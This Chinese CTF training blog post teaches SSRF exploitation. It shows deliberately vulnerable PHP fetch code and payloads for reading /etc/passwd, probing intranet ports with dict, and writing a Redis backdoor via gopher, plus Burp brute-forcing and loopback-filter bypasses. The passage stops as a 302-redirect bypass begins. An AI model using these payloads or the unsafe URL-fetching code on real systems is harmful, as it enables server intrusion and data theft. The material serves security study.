<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 8.1.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/sign.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/small.ico">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"hnu-legend1440.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="拂云观 · legend1440">
<meta property="og:url" content="http://hnu-legend1440.com/index.html">
<meta property="og:site_name" content="拂云观 · legend1440">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="legend1440">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://hnu-legend1440.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>拂云观 · legend1440</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">拂云观 · legend1440</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-schedule">

    <a href="/categories/schedule/" rel="section"><i class="fa fa-skating fa-fw"></i>期末突击</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-chess fa-fw"></i>往世乐土</a>

  </li>
        <li class="menu-item menu-item-training">

    <a href="/categories/training/" rel="section"><i class="fa fa-yin-yang fa-fw"></i>集训修行</a>

  </li>
        <li class="menu-item menu-item-wp">

    <a href="/categories/WP/" rel="section"><i class="fa fa-feather fa-fw"></i>全面战场</a>

  </li>
        <li class="menu-item menu-item-puzzles">

    <a href="/categories/puzzles/" rel="section"><i class="fa fa-spa fa-fw"></i>练习札记</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hnu-legend1440.com/2026/12/09/%E7%AC%AC%E5%85%AB%E7%AB%A0-SSRF%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="legend1440">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="拂云观 · legend1440">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2026/12/09/%E7%AC%AC%E5%85%AB%E7%AB%A0-SSRF%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">第八章-SSRF漏洞</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2026-12-09 12:00:00" itemprop="dateCreated datePublished" datetime="2026-12-09T12:00:00+08:00">2026-12-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2026-01-21 01:53:36" itemprop="dateModified" datetime="2026-01-21T01:53:36+08:00">2026-01-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/training/" itemprop="url" rel="index"><span itemprop="name">-training</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>飞书链接:<a target="_blank" rel="noopener" href="https://icnewi51k2yp.feishu.cn/wiki/KTLBwFFFkigQbpkPUZTc5egEnCc?from=from_copylink">https://icnewi51k2yp.feishu.cn/wiki/KTLBwFFFkigQbpkPUZTc5egEnCc?from=from_copylink</a></p>
<h1 id="Week9-1-SSRF-漏洞绪论"><a href="#Week9-1-SSRF-漏洞绪论" class="headerlink" title="[Week9.1]SSRF 漏洞绪论"></a>[Week9.1]SSRF 漏洞绪论</h1><h3 id="SSRF-漏洞简介"><a href="#SSRF-漏洞简介" class="headerlink" title="SSRF 漏洞简介"></a>SSRF 漏洞简介</h3><h4 id="核心定义"><a href="#核心定义" class="headerlink" title="核心定义"></a>核心定义</h4><p>SSRF &#x3D; 服务器端请求伪造 → <strong>你让服务器替你发请求</strong>，服务器能访问的资源（本地文件、内网服务），你自己访问不了，但通过 SSRF 就能 “借服务器的手” 拿到。</p>
<h4 id="类比示例"><a href="#类比示例" class="headerlink" title="类比示例"></a><strong>类比示例</strong></h4><p>你想去邻居家（服务器内网）偷东西，但你进不去（你直接访问不了内网）；你骗物业（服务器）：“帮我去邻居家拿个快递”（构造 SSRF 请求）；物业有钥匙（服务器能访问内网），真的去邻居家帮你拿了（服务器执行请求，返回结果给你）；→ 你没进门，却拿到了邻居家的东西 &#x3D; SSRF 攻击成功。</p>
<h4 id="技术层面示例"><a href="#技术层面示例" class="headerlink" title="技术层面示例"></a>技术层面示例</h4><p>靶机有个文件读取接口：<code>http://靶机/fetch.php?url=xxx</code>，功能是 “服务器根据你传的 url，去获取内容并返回给你”。</p>
<ul>
<li>正常用法：你传 <code>url=``https://www.baidu.com</code> → 服务器帮你爬百度页面，返回给你；</li>
<li>SSRF 攻击：你传 <code>url=file:///var/www/html/flag.php</code> → 服务器帮你读它本地的 flag.php，把内容返回给你（你自己直接访问不到这个文件）；</li>
<li>关键：服务器的权限远大于你，它能访问自己的本地文件、内网机器，你通过 SSRF 就能 “蹭” 它的权限。</li>
</ul>
<p><img src="/images/P5eCbhdtso6d5xxakydcZrmRnJh.png"></p>
<h3 id="SSRF-核心应用场景"><a href="#SSRF-核心应用场景" class="headerlink" title="SSRF 核心应用场景"></a>SSRF 核心应用场景</h3><p><img src="/images/UGo8bjjdAogbpCx6Ocxcer2BnWa.png"></p>
<h4 id="场景-1：读取服务器本地文件"><a href="#场景-1：读取服务器本地文件" class="headerlink" title="场景 1：读取服务器本地文件"></a>场景 1：读取服务器本地文件</h4><p>用 <code>file://</code> 协议，让服务器读它自己的文件：</p>
<ul>
<li>测试 Payload：<code>http://靶机/fetch.php?url=file:///etc/passwd</code>（&#x2F;etc&#x2F;passwd 是 Linux 系统必有的文件，能读到说明 SSRF 存在）；</li>
<li>拿 flagPayload：<code>http://靶机/fetch.php?url=file:///var/www/html/flag.php</code>（根据题目提示的 flag 路径调整）；</li>
</ul>
<h4 id="场景-2：探测内网服务"><a href="#场景-2：探测内网服务" class="headerlink" title="场景 2：探测内网服务"></a>场景 2：探测内网服务</h4><p>服务器内网可能有隐藏的服务（比如数据库、后台管理页），你直接访问不了，但服务器能访问：</p>
<ul>
<li>测试内网 IP：<code>http://靶机/fetch.php?url=``http://192.168.1.101:80</code>（看是否能访问内网 101 机器的 80 端口）；</li>
<li>测试本地端口：<code>http://靶机/fetch.php?url=``http://127.0.0.1:3306</code>（看本地是否开了 MySQL 服务）；</li>
</ul>
<h4 id="场景-3：攻击内网服务（了解即可）"><a href="#场景-3：攻击内网服务（了解即可）" class="headerlink" title="场景 3：攻击内网服务（了解即可）"></a>场景 3：攻击内网服务（了解即可）</h4><p>如果内网服务有漏洞（比如 Redis 未授权访问），通过 SSRF 让服务器去攻击内网服务：</p>
<ul>
<li>例子：<code>http://靶机/fetch.php?url=gopher://127.0.0.1:6379/_CONFIG SET dir /var/www/html</code>（让服务器给内网 Redis 发命令，写后门文件）；</li>
</ul>
<h3 id="前置知识-NAT"><a href="#前置知识-NAT" class="headerlink" title="前置知识 NAT"></a>前置知识 NAT</h3><p>NAT(Network Address Translation)</p>
<p>网络地址转换</p>
<p>通过将一个外部 IP 地址和端口映射到</p>
<p>更大的内部 IP 地址集来转换 IP 地址。</p>
<p><img src="/images/Ltp9bUkt8ovsZzxzMDOcb6g8n4b.png"></p>
<h3 id="漏洞举例"><a href="#漏洞举例" class="headerlink" title="漏洞举例"></a>漏洞举例</h3><p>我们正常访问 127.0.0.1&#x2F;flag.php 是没办法访问的，但题目中有特定程序处理 URL 参数，并以服务器的高权限身份访问到了这一(可能是内网)的内容</p>
<p><img src="/images/U373bvAkZoA5mFxUm7lclniDnJl.png"></p>
<h1 id="Week9-2-SSRF-漏洞利用"><a href="#Week9-2-SSRF-漏洞利用" class="headerlink" title="[Week9.2]SSRF 漏洞利用"></a>[Week9.2]SSRF 漏洞利用</h1><p><em>注:SSRF 靶场在本节作为例题出现过的，本章实验就不会再出现了</em></p>
<h2 id="认识-127-0-0-1"><a href="#认识-127-0-0-1" class="headerlink" title="认识 127.0.0.1"></a>认识 127.0.0.1</h2><p><code>127.0.0.1</code> 是服务器的<strong>本地回环地址，是只在服务器本机生效的 IP</strong>，数据不会走外网，只有服务器自己能访问这个地址对应的资源，你如果不用服务器的程序代码，而是直接用浏览器 URL 访问 <code>127.0.0.1</code>，访问的是你自己的电脑，不是靶机服务器的</p>
<p><img src="/images/KfjGbVjbMoEGasxunnscEiDTnee.png"></p>
<h2 id="SSRF-重要函数"><a href="#SSRF-重要函数" class="headerlink" title="SSRF 重要函数"></a>SSRF 重要函数</h2><h3 id="file-get-contents-与-readfile"><a href="#file-get-contents-与-readfile" class="headerlink" title="file_get_contents() 与 readfile()"></a>file_get_contents() 与 readfile()</h3><p><code>file_get_contents</code> 这一函数是把 <strong>传入的参数(变量)</strong> 写入字符串，当把 <strong>传参</strong> 是内网文件的时候，会先去把这个文件的内容读出来再写入，导致了任意文件读取，也就是信息泄露的一种。一般这种攻击也与目录遍历相结合。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/Rj2SbZEY4oPtEpx8bf9cZ0Fqnjg.png"></p>
<h3 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h3><p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code>  用于打开一个网络连接或者一个 Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定 url  数据的获取。该函数会使用 socket 跟服务器建立 tcp 连接，进行传输原始数据。 fsockopen()  将返回一个文件句柄，之后可以被其他文件类函数调用 <code>（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）</code> 如果调用失败，将返回 false。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="number">80</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">    <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h3><p>curl_init(url) 函数初始化一个新的会话，返回一个 cURL 句柄，供 <code>curl_setopt()，curl_exec()和curl_close()</code> 函数使用。</p>
<p><em>注:</em><strong>cURL 句柄就是你给 cURL 工具 “开的一个专属操作窗口”</strong>_ —— 你要让 cURL 帮你发 HTTP&#x2F;HTTPS&#x2F;FTP 等请求，得先 “开一个窗口（创建句柄）”，在这个窗口里设置请求的 URL、请求方法、头信息等参数，让 cURL 按你的要求干活，干完活再 “关掉这个窗口（关闭句柄）”。_</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// 1. 检测URL中是否传入了名为url的GET参数（核心触发条件）</span></span><br><span class="line"><span class="comment">// 比如访问 http://localhost/ssrf.php?url=http://127.0.0.1/flag.php 时，该条件成立</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 2. 将GET参数url的值赋值给变量$link，后续作为cURL请求的目标地址</span></span><br><span class="line">    <span class="comment">// $link就是攻击者可控的核心参数，也是SSRF漏洞的入口</span></span><br><span class="line">        <span class="variable">$link</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 3. 初始化cURL会话，返回一个cURL句柄（资源类型）</span></span><br><span class="line">        <span class="comment">// 句柄是后续配置cURL请求、执行请求的唯一标识，所有操作都基于这个句柄</span></span><br><span class="line">        <span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>(); </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 4. 设置cURL参数：强制使用GET请求（禁用POST）</span></span><br><span class="line">        <span class="comment">// CURLOPT_POST=0 表示请求方法为GET；若设为1则为POST请求</span></span><br><span class="line">        <span class="comment">// 该配置限制了请求方法，但不影响SSRF的核心利用（GET已足够访问文件/内网）</span></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 5. 设置cURL的核心参数：指定要请求的目标URL</span></span><br><span class="line">        <span class="comment">// 将攻击者可控的$link作为请求地址，这是SSRF的关键——服务器会按这个地址发送请求</span></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 6. 设置cURL参数：将请求结果以字符串返回，而非直接输出到浏览器</span></span><br><span class="line">        <span class="comment">// 若不设该参数，curl_exec()会直接把结果打印到页面，设为1则可将结果存入变量$result</span></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 7. 执行cURL会话：根据上述配置发送请求，并获取响应结果</span></span><br><span class="line">        <span class="comment">// 服务器会代替攻击者访问$link指定的地址（本地文件/内网服务/外网），并把响应内容赋值给$result</span></span><br><span class="line">        <span class="comment">// 这一步是SSRF漏洞的核心执行过程：服务器主动发起请求，获取目标资源</span></span><br><span class="line">        <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>); </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 8. 关闭cURL句柄，释放系统资源（避免内存泄漏）</span></span><br><span class="line">        <span class="comment">// 执行完请求后必须关闭句柄，是cURL使用的规范操作</span></span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>); </span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 以下两行是被注释的代码，原本功能是将请求结果写入本地文件（可忽略）</span></span><br><span class="line">        <span class="comment">// $filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;; // 生成随机文件名，避免重复</span></span><br><span class="line">        <span class="comment">// file_put_contents($filename, $result); // 将$result写入本地文件</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 9. 输出cURL请求的结果到浏览器</span></span><br><span class="line">        <span class="comment">// 攻击者可通过这一步获取服务器请求$link后的响应内容（比如本地flag文件、内网服务信息）</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们可以通过 <code>file、dict、gopher</code> 这三个协议来进行渗透，提高 <code>curl_exec()</code> 这里的攻击危害。</p>
<p>下见危险协议</p>
<h2 id="SSRF-信息收集伪协议"><a href="#SSRF-信息收集伪协议" class="headerlink" title="SSRF 信息收集伪协议"></a>SSRF 信息收集伪协议</h2><h3 id="File-伪协议"><a href="#File-伪协议" class="headerlink" title="File 伪协议"></a>File 伪协议</h3><p>file:&#x2F;&#x2F;从文件系统中获取文件内容，格式为 file:&#x2F;&#x2F;[文件路径]</p>
<p>这些是常使用的文件名读取</p>
<p><img src="/images/MRNtbeQq0oqgBOxP8Exc5T9Entd.png"></p>
<p>file 伪协议的用途一般是查找内网存活主机，这里涉及到对 arp 和 burp 爆破的应用，这里暂不叙述，CTF 解题时若遇到再进行举例</p>
<p>大致就是，先用 burp 爆破所有想查询的范围</p>
<p><img src="/images/QZesbMZCjoTTMpxkwizcfoMwnsh.png"></p>
<p>然后如下访问 arp 缓存表</p>
<p><img src="/images/ANJYb93uDoL9nSxtDtNcZReqnJb.png"></p>
<p>扫到一个这样的表，观察圈起来的这一列与众不同的就是打开的主机了</p>
<p><img src="/images/XTjwbvuYVof40mxk1hRcgyDrnze.png"></p>
<h4 id="实验举例-hello-ssrf-Level1"><a href="#实验举例-hello-ssrf-Level1" class="headerlink" title="[实验举例]hello-ssrf-Level1"></a>[实验举例]hello-ssrf-Level1</h4><p>使用服务器提供的请求来读取根目录下 flag 文件</p>
<p><img src="/images/KdNgbWgWxoNo6Wx50A4cZIRbnjw.png"></p>
<h3 id="Dict-伪协议-端口扫描"><a href="#Dict-伪协议-端口扫描" class="headerlink" title="Dict 伪协议(端口扫描)"></a>Dict 伪协议(端口扫描)</h3><p>利用 <code>dict</code> 协议，<code>dict://&lt;ip&gt;/info</code> 可获取本地 <code>redis</code> 服务配置信息。</p>
<p>对后续漏洞(查找内网主机开放端口等)有所帮助</p>
<h4 id="实验举例-hello-ssrf-Level2"><a href="#实验举例-hello-ssrf-Level2" class="headerlink" title="[实验举例]hello-ssrf-Level2"></a>[实验举例]hello-ssrf-Level2</h4><p>SSRF 中的端口探测，我们常用 <code>dict</code> 协议进行端口扫描.</p>
<p><img src="/images/GZDfb2I02o010cxnWKmcAfFon2f.png"></p>
<p>我们可以先输一输 80 端口，看下请求有结果不</p>
<p><img src="/images/OFDMbkGTror3XfxUVMPcnBIKnSc.png"></p>
<p>会显示结果，再输一次 80 端口，打开 burp 拦截</p>
<p><img src="/images/ZyGvbM5rDoJy0yxgXn9czSAMnlh.png"></p>
<p>右键，发送到 intruder 进行爆破</p>
<p>选择单个 payload 狙击手 框选 80 点击添加 payload 位置</p>
<p><img src="/images/Da3Ybpc7MoMmIrxtHG7c7Qsanke.png"></p>
<p>payload 界面:</p>
<p>payload 类型选择数值，范围按照题目给的 1 到 1 万</p>
<p><img src="/images/BmwlbVnNNoOy5zxbJpwcFMh2ngc.png"></p>
<p>按照题目所说:dict:&#x2F;&#x2F;ip:prot”当遇到开放端口时，响应速度会明显变慢</p>
<p>观察一下爆破结果，哪些端口响应速度比较慢</p>
<p>点击列，手动添加这两列</p>
<p><img src="/images/WJewbuOuyo9fI7xs8zZcVlRGnpg.png"></p>
<p>爆破完毕后应该有一万条结果，看看哪些时间比较长，比如图中的 9001 端口</p>
<p>我们再手动把端口输进去，查询结果发现是旗帜的一部分</p>
<p><img src="/images/OSbrbUGNooXbtExiGRjcM9uXnmc.png"></p>
<p>把五个端口全部找到，便可以获得完整的旗帜了</p>
<p><img src="/images/OGeYbi4mRoozPQx29f0cra2Dnrc.png"></p>
<p>flag{222279809ec64168a5790fd9a6088e1f}</p>
<h3 id="Http-协议"><a href="#Http-协议" class="headerlink" title="Http 协议"></a><strong>Http 协议</strong></h3><p>作用：常规 URL 形式，允许通过 HTTP1.0 的 GET 方法，以只读访问文件或资源，<strong>即进行目录扫描</strong>。</p>
<p>此外你要进行 post 提交和 get 提交你必须用 http 协议</p>
<p>CTF 中通常用于远程包含。</p>
<p><img src="/images/M3J1bvxXmoyghXxVCVXcN6O6nPc.png"></p>
<p>使用 Burp 爆破 +http 伪协议读特定的(未知名称的)php 文件</p>
<p><img src="/images/ITCqb3dpjoXhvoxoqWqc56POnLb.png"></p>
<h3 id="gopher-协议-POST-提交数据"><a href="#gopher-协议-POST-提交数据" class="headerlink" title="gopher 协议(POST 提交数据)"></a>gopher 协议(POST 提交数据)</h3><p>假如我们想要用 SSRF 访问无权限访问的 php 文件，还想 post 或 get 提交数据，对于 get，可以直接用 http 协议解决，</p>
<p>对于 post，则需要用 gopher 协议</p>
<p><img src="/images/V2iBbUYQ5oLH26xKG5UcEcpznVb.png"></p>
<p><strong>用 gopher 协议进行 get 提交</strong></p>
<p>头部信息可以使用 Burp 抓包获得</p>
<p><img src="/images/DL7MblqJsoo606xYpwecq4SdnOb.png"></p>
<p><img src="/images/KDmVbM6Rbo3rjRx4RsIctu8mnzc.png"></p>
<p>注意最后需要增加一个换行符</p>
<p><strong>用 gopher 协议进行 post 提交</strong></p>
<p>POST 则需要保留更多的头部信息，并且图中缺了必要的路径和目标 ip 地址，我们应该像 get 一样加上</p>
<p><img src="/images/AGNvbQiqyoL9wuxHAHXc60JNnQb.png"></p>
<p>其中后面两点和你 post 提交的内容相关联</p>
<p>字符转换前在 post 前另起两行</p>
<p><img src="/images/H6SkbufXToPXMPx2wENcIv2Fnrd.png"></p>
<h2 id="SSRF-绕过过滤"><a href="#SSRF-绕过过滤" class="headerlink" title="SSRF 绕过过滤"></a>SSRF 绕过过滤</h2><p>第二第三个过滤都不太容易实操，先了解一下吧</p>
<h3 id="127-0-0-1-过滤绕过-环回地址绕过"><a href="#127-0-0-1-过滤绕过-环回地址绕过" class="headerlink" title="127.0.0.1 过滤绕过(环回地址绕过)"></a>127.0.0.1 过滤绕过(环回地址绕过)</h3><p><img src="/images/P0wrbmABKoMPxhxhnf3cYB4In9f.png"></p>
<p>有的题目会限制 127.0.0.1 的访问，可以更换别的表达方式</p>
<p><img src="/images/AN24baomRoyEiAxPnEzcM5ckn7g.png"></p>
<p><img src="/images/JOKsbnblHojLlOxW7KxcyxIznsg.png"></p>
<p>还有一些其他的方法，这里暂不赘述(进制是最好用的)</p>
<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/05/16/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1SSRF">https://drun1baby.top/2022/05/16/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1SSRF</a></p>
<p>经过做题，发现 127.0.0.2 和单独的一个 0 也适用，后面这些也有可能奏效</p>
<p><img src="/images/AaQCbyVEEoBOZmxAydAcFTu5n2c.png"></p>
<p>还有 ipv6– ::1 等价于 127.0.0.1</p>
<h3 id="302-重定向绕过"><a href="#302-重定向绕过" class="headerlink" title="302 重定向绕过"></a>302 重定向绕过</h3><p>SSRF 的 302 重定向绕过，就是出题人给 SSRF 加了 “黑名单过滤”（比如禁止访问 127.0.0.1、file:&#x2F;&#x2F; 协议），你直接传 <code>127.0.0.1/flag</code> 会被拦，但你可以先搭一个 “中转服务器”，让目标服务器访问你的中转服务器时触发 302 重定向，偷偷跳转到被禁止的地址（比如 127.0.0.1&#x2F;flag），绕开黑名单检测</p>
<p><img src="/images/IAobb8V7yo8QwOxa8Vjc71hEnPg.png"></p>
<h4 id="步骤-1：搭你的-302-重定向中转服务器（用-PHP-Python-都可以）"><a href="#步骤-1：搭你的-302-重定向中转服务器（用-PHP-Python-都可以）" class="headerlink" title="步骤 1：搭你的 302 重定向中转服务器（用 PHP&#x2F;Python 都可以）"></a>步骤 1：搭你的 302 重定向中转服务器（用 PHP&#x2F;Python 都可以）</h4><p>这里用最简单的 PHP 写 <code>redirect.php</code>（放到你的公网服务器 &#x2F; 本地穿透地址）：</p>
